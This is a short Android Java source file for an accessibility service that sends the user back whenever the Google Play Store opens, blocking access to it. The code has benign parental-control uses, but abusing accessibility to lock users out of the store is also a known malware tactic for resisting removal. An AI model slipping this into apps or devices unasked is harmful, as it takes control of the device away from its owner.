package com.framework.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

public class PlayStoreBlockerService extends AccessibilityService {

    private static final String PLAY_STORE_PACKAGE = "com.android.vending";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return;

        String packageName = String.valueOf(event.getPackageName());
        if (PLAY_STORE_PACKAGE.equals(packageName)) {
            performGlobalAction(GLOBAL_ACTION_BACK);
        }
    }

    @Override
    public void onInterrupt() {
        // Nothing needed
    }
}
